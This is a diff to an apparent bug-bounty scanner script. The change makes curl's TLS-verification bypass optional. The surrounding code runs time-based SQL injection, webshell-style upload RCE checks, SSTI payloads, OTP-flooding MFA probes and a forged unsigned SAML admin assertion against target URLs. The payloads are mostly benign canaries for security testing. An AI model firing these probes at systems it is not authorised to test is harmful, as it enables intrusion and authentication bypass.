@@ -57,6 +57,10 @@ RECON_DIR=""
 QUICK_MODE=""
 FULL_MODE=""
 SKIP_CHECKS=""
+CURL_TLS_ARGS=()
+if [ "${HUNTER_LAB_INSECURE_TLS:-0}" = "1" ]; then
+    CURL_TLS_ARGS=(-k)
+fi
 
 while [ "$#" -gt 0 ]; do
     arg="$1"
@@ -64,6 +68,7 @@ while [ "$#" -gt 0 ]; do
         --quick) QUICK_MODE="--quick" ;;
         --full) FULL_MODE="--full" ;;
         --skip) shift; SKIP_CHECKS="${SKIP_CHECKS:-}${SKIP_CHECKS:+,}$1" ;;
+        --insecure) CURL_TLS_ARGS=(-k) ;;
         *) RECON_DIR="$arg" ;;
     esac
     shift
@@ -167,17 +172,17 @@ verify_sqli_poc() {
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
     
     # 1. Baseline (0s)
-    T0_START=$(_now_ns); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; T0=$(( ($(_now_ns) - T0_START) / 1000000 ))
+    T0_START=$(_now_ns); curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; T0=$(( ($(_now_ns) - T0_START) / 1000000 ))
 
     # 2. 1s Sleep
     local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
     U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
-    T1_START=$(_now_ns); curl -sk -o /dev/null --max-time 25 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U1"; T1=$(( ($(_now_ns) - T1_START) / 1000000 ))
+    T1_START=$(_now_ns); curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null --max-time 25 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U1"; T1=$(( ($(_now_ns) - T1_START) / 1000000 ))
 
     # 3. 2s Sleep
     local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
-    T2_START=$(_now_ns); curl -sk -o /dev/null --max-time 30 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U2"; T2=$(( ($(_now_ns) - T2_START) / 1000000 ))
+    T2_START=$(_now_ns); curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null --max-time 30 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U2"; T2=$(( ($(_now_ns) - T2_START) / 1000000 ))
     
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
@@ -193,7 +198,7 @@ verify_upload_poc() {
     
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
-    local headers=$(curl -sk -I --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" || true)
+    local headers=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -I --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
     
@@ -203,12 +208,12 @@ verify_upload_poc() {
     
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
-        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" > /dev/null || true
+        curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -F "${param}=@/tmp/${canary}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" > /dev/null || true
 
         # Check common upload dirs
         for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
             local probe_url="${base_url}${dir}${canary}"
-            local resp=$(curl -sk -f --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$probe_url" || true)
+            local resp=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -f --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$probe_url" || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                 echo "[CONFIRMED] [RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
@@ -245,7 +250,7 @@ if ! skip_has upload; then
         [ -z "$host" ] && continue
         # Baseline must go through the same session as the real probes, else an
         # authenticated run compares authed responses against an anonymous 401.
-        if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
+        if [ "$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
             log_warn "Catchall detected: $host"
             CATCHALL_HOSTS="${CATCHALL_HOSTS},${host},"
         fi
@@ -259,7 +264,7 @@ if ! skip_has upload; then
         case "$CATCHALL_HOSTS" in *",${host},"*) continue ;; esac
         for path in "${PROBE_PATHS[@]}"; do
             U="${host%/}${path}"
-            if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U")" -eq 200 ]; then
+            if [ "$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U")" -eq 200 ]; then
                 log_vuln "Found upload path: $U"
                 echo "[INFORMATIONAL] [UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                 verify_upload_poc "$U"
@@ -282,7 +287,7 @@ if ! skip_has sqli; then
         log_step "Advanced SQLi verification on top 10 parameterised URLs..."
         head -10 "$PARAMS_FILE" | while read -r url; do
             [ -z "$url" ] && continue
-            T_START=$(_now_ns); curl -sk -o /dev/null --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; BASE_MS=$(( ($(_now_ns) - T_START) / 1000000 ))
+            T_START=$(_now_ns); curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; BASE_MS=$(( ($(_now_ns) - T_START) / 1000000 ))
             P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
             [ "$P_COUNT" -eq 0 ] && continue
             for i in $(seq 1 "$P_COUNT"); do
@@ -290,7 +295,7 @@ if ! skip_has sqli; then
                     p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
                     # Fixed sed: use alternate delimiter and correct numeric occurrence
                     SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
-                    TS=$(_now_ns); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(_now_ns) - TS) / 1000000 ))
+                    TS=$(_now_ns); curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(_now_ns) - TS) / 1000000 ))
                     if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                         if verify_sqli_poc "$url" "$i" "$dialect"; then
                             log_crit "EMPIRICAL SQLI POC: $url"
@@ -390,7 +395,7 @@ if ! skip_has ssti; then
                 payload="${SSTI_PAYLOADS[$idx]}"
                 enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
                 injected=$(echo "$url" | sed "s/=\([^&]*\)/=${enc_payload}/g")
-                body=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$injected" 2>/dev/null || true)
+                body=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$injected" 2>/dev/null || true)
                 if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                     log_crit "SSTI confirmed [$engine]: $injected"
                     echo "[CONFIRMED] [SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
@@ -408,7 +413,7 @@ if ! skip_has cms; then
     log_info "Check 7: CMS Detection & MSF Generation"
     head -50 "$ORDERED_SCAN" | while read -r url; do
         [ -z "$url" ] && continue
-        RES=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
+        RES=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
         CMS=""; if echo "$RES" | grep -qi "wp-content\|wordpress"; then CMS="wordpress"; elif echo "$RES" | grep -qi "drupal"; then CMS="drupal"; fi
         if [ -n "$CMS" ]; then
             log_vuln "$CMS detected: $url"
@@ -448,7 +453,7 @@ if ! skip_has mfa; then
             if unsafe_method_guard "POST" "$BASE" "MFA rate-limit probe"; then
                 log_step "Rate limit probe: $BASE"
                 STATUS_CODES=$(for i in $(seq 1 15); do
-                    curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
+                    curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}\n" --max-time 5 \
                         -X POST "$BASE" \
                         -H "Content-Type: application/json" \
                         -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
@@ -467,7 +472,7 @@ if ! skip_has mfa; then
             # destroys the check. Do not "fix" by adding the auth array here.
             for PROTECTED in dashboard home profile account settings admin; do
                 HOST=$(echo "$url" | grep -oE "https?://[^/]+")
-                SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                SKIP_CODE=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 5 \
                     "$HOST/$PROTECTED" 2>/dev/null || echo "0")
                 if [ "$SKIP_CODE" = "200" ]; then
                     log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
@@ -478,7 +483,7 @@ if ! skip_has mfa; then
             # --- Test 3: Response manipulation canary ---
             # Check if server returns JSON with a success/failure flag (indicator only)
             if unsafe_method_guard "POST" "$BASE" "MFA response-manipulation canary"; then
-                RESP=$(curl -sk --max-time 5 -X POST "$BASE" \
+                RESP=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 5 -X POST "$BASE" \
                     -H "Content-Type: application/json" \
                     -d '{"otp":"999999"}' 2>/dev/null || true)
                 if echo "$RESP" | grep -qi '"success"\s*:\s*false\|"verified"\s*:\s*false\|"status"\s*:\s*"fail"'; then
@@ -510,7 +515,7 @@ if ! skip_has saml; then
         # path tells us nothing by answering the same for /saml/*. Without this,
         # any catch-all host (SPA, permissive proxy route) reports the whole SAML
         # path list as discovered endpoints.
-        SAML_CONTROL=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+        SAML_CONTROL=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 5 \
             ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} \
             "${host}/saml-control-$RANDOM$$" 2>/dev/null || echo "0")
         case "$SAML_CONTROL" in
@@ -522,7 +527,7 @@ if ! skip_has saml; then
         for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
                          "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
                          "/.well-known/openid-configuration"; do
-            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+            CODE=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 5 \
                 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} \
                 "${host}${SAML_PATH}" 2>/dev/null || echo "0")
             case "$CODE" in
@@ -537,7 +542,7 @@ if ! skip_has saml; then
     # Metadata exposure check (reveals IdP certs, entity IDs — aids XSW)
     while IFS= read -r url; do
         [ -z "$url" ] && continue
-        RESP=$(curl -sk --max-time 8 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
+        RESP=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 8 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
         if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
             log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
             echo "[INFORMATIONAL] [SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
@@ -560,7 +565,7 @@ if ! skip_has saml; then
             # with an already-valid session returns 200/302 regardless, turning every
             # authenticated run into a false CRITICAL. Do not "fix" by adding auth.
             STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
-            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
+            CODE=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -o /dev/null -w "%{http_code}" --max-time 8 \
                 -X POST "$ACS_URL" \
                 -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
             if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
